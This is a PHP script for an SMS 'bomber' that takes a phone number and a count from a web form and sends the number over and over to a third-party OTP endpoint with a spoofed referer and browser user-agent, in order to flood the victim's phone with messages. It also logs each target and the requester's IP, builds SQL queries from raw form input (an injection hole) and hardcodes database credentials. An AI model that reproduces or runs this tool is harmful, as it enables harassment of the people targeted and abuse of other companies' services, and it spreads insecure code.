
<style> 


h1 {
	text-align: center;
	color: Green;
}

</style>


 
<?php
ob_start();

error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE);

  


if(empty($_POST["submit"]) AND !empty($_POST["ph"]))
{
	
	/*************************** FOR USER AGENT /IP ADDR********************/
	
	function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
	
	$servername = "localhost";
$username = "saif";
$password = "root";
$dbname = "phone";

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
//TO CHECK DATABASES FOR NUMBER;
$to_bomb; $today_date=date("j:m:Y");
$bombed_date;
$find=" SELECT id,day,SUM(times) AS total from number_info where number='".$_POST["ph"]."' AND day='".$today_date."'";
$result = mysqli_query($conn, $find);
if (mysqli_num_rows($result) > 0) {
    // output data of each row
    while($row = mysqli_fetch_assoc($result)) {
        echo "id: " . $row["id"]. " - Number: "."DAY: ".$row["day"] . $row["number"]. " TOTAL TIMES:".$row["total"]. "<br>";
		$to_bomb=$row["total"];
		$bombed_date=$row["day"];
		break;
    }
}
if($today_date==$bombed_date)
{
	
	//echo "total time ".$to_bomb."<br>";
$execute1=$to_bomb + $_POST["count"];
if($to_bomb>=150)
{
	echo "<h1>LIMIT EXCEED FOR TODAY</h1>";
	echo "<a href=\"/hello.html\" > hello <a/>";
	die();
}

else if($execute1>150)
{    $limit=$to_bomb - 150;
	
	echo "<h1>Today LIMIT AVAILBLE FOR THIS  NUMBER:".	$limit."</h1>";
	echo "<a href=\"/hello.html\" > hello <a/>";
	echo "<br>";
	die();
}
else{
	$execute=$_POST["count"];
	//echo "ECXECUTE:".$execute;
	echo "<br>";
	
}
	
	
}


$sql = "INSERT INTO number_info (number,times,bomber_time,ip_addr,day) values('".$_POST["ph"]."',".$_POST["count"].",now(),'".get_client_ip()."','".$today_date."')";
if (mysqli_query($conn, $sql)) {
    $last_id = mysqli_insert_id($conn);
    echo "New record created successfully. Last inserted ID is: " . $last_id;
} else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}


	
	//echo sql;
	//echo $find;
	
	mysqli_close();
	ini_set('max_execution_time', 0);
	
$NumRecord="NUMBER.txt";
$file=fopen($NumRecord,"a+");
if($file==false)
{
	echo "FILE NOT OPENED";
}


fwrite($file,date('d-m-Y'));
	fputs($file," : ");
	fwrite($file,date('h:i:s a'));
	fwrite($file,"\n");
	fwrite($file,"NUMBER: ");
	   fwrite( $file, $_POST["ph"] );
	   fwrite($file,"  TIME:");
	   fwrite($file,$_POST["count"]);
	   fwrite($file,"\n");
$url="<api>"; 
echo "<h3>NUMBER: ".$_POST["ph"];
echo"<br>";
echo "<h3>TIMES:".$_POST["count"];
$refers = "https://freekaamaal.com/";
$ch = curl_init(); 
curl_setopt ($ch, CURLOPT_URL, $url); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
curl_setopt ($ch, CURLOPT_TIMEOUT,10); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_REFERER, $refers); 
curl_setopt ($ch, CURLOPT_POST, 1); 
curl_setopt($ch, CURLOPT_POSTFIELDS, "number=".$_POST["ph"]);
curl_setopt($ch,CURLOPT_POSTREDIR,10);
$headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'accept-Encoding: gzip, deflate, br',
    'accept-Language: en-US,en;q=0.5',
    'content-Type: application/x-www-form-urlencoded; charset=utf-8',
    'host: www.goibibo.com',
    'referer: https://freekaamaal.com/', //Your referrer address
    'user-Agent: Mozilla/5.0 (Windows NT 10.0; …) Gecko/20100101 Firefox/67.0',
	'content-length: 14',
	'connection: keep-alive',
	'upgrade-insecure-requests: 1'
];
curl_setopt($ch,CURLO_HTTPHEADER,$headers);
/*
if($_POST["count"]>150)
{
	$execute=0;
}
else
{
	$execute=$_POST["count"];
}

	*/
for($i=0;$i<$execute;$i++)
{	
$result = curl_exec ($ch);

if (curl_errno($ch)) {
    // this would be your first hint that something went wrong
    die('Couldn\'t send request: ' . curl_error($ch));
} else {
    // check the HTTP status code of the request
    $resultStatus = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($resultStatus == 200) {
    
    } else {
        // the request did not complete as expected. common errors are 4xx
        // (not found, bad request, etc.) and 5xx (usually concerning
        // errors/exceptions in the remote script execution)

        die('Request failed: HTTP status code: ' . $resultStatus);
    }
}
echo"<br>"; 
//echo $result;
sleep(2); 
}
curl_close($ch);
}	


else{
	$i=2;
}
echo " ";
if($i==$_POST["count"] || $i==$execute)
{
	header('Location: /index.html',true,300);
}
	 
#Number==ph
#times=count
#password=pass
	  
?>